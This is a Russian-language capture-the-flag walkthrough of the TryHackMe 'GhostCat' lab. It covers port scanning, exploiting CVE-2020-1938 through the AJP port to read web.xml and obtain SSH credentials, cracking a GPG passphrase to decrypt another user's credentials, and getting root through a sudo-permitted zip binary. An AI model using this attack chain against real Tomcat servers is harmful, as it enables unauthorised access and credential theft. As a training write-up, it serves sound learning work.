nmap показывает 4 открытых порта. Для ssh ничего нет, остальные изучим попозже.
```
Nmap scan report for 10.114.188.57
Host is up (0.010s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 9.55 seconds
```

Запустим более подробное сканирование. Изучим веб-сервер на 8080.
```
Nmap scan report for 10.114.188.57
Host is up (0.0091s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
```

Обычная стандартная страница.

![](../images/Pasted%20image%2020260521210458.png)

Насколько понял это достаточно новая версия tomcat, значительных cve у нее нет.
Пока работает фаззер скрытых файлов и директорий, я изучал взаимодействие с сайтом и понял что при переходе на любую страницу в директории manager у нас светится 403 ошибка. Этоо означает что вход "извне" недоступен.

![](../images/Pasted%20image%2020260521215812.png)

Дальше я решил изучить 53 порт и понял что ничего интересного там найти нельзя. Это обычный днс резолвер.

Идем дальше по портам. 8009 - ajp13. Поискав информацию в интернете, я нашел CVE-2020-1938. Эта уязвимость работает на ajp13 в связке с tomcat 9.0.30. Это критическая уязвимость, приводящая к LFI. Я нашел готовый экслоит в виде кода на пайтоне для этой уязвимости.
```
└─$ python2 CVE-2020-1938.py -p 8009 -f WEB-INF/web.xml 10.114.188.57
Getting resource at ajp13://10.114.188.57:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

Действительно, всё работает. Мы нашли креды для входа в систему.

Заходим по ssh и читаем флаг пользователя.

![](../images/Pasted%20image%2020260521225421.png)

Также можно заметить два файла в домашней директории, это credential.pgp и tryhackme.asc. Второй файл - это ключ к первому, но нам нужен пароль. Поэтому попробуем перебрать его через jhon.

Пароль ломается за секунды. Расшифровываем другой файл.

![](../images/Pasted%20image%2020260521230132.png)

Получаем креды для другого пользователя. Заходим через ssh.
```
└─$ gpg --import tryhackme.asc
gpg: ключ 8F3DA3DEC6707170: импортирован открытый ключ "tryhackme <stuxnet@tryhackme.com>"
gpg: ключ 8F3DA3DEC6707170: импортирован секретный ключ
gpg: ключ 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" не изменен
gpg: Всего обработано: 2
gpg:                  импортировано: 1
gpg:                   неизмененных: 1
gpg:     прочитано секретных ключей: 1
gpg: импортировано секретных ключей: 1

└─$ gpg --decrypt credential.pgp
gpg: encrypted with elg1024 key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
gpg: Внимание: в списке предпочтений получателя алгоритм шифрования CAST5 не найден
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j          
```

Проверив sudo -l я увидел там zip. Это явный путь для эскалации привилегий.

![](../images/Pasted%20image%2020260521230433.png)

Выполняем простейшую команду, получаем рута и читаем флаг.

![](../images/Pasted%20image%2020260521230716.png)
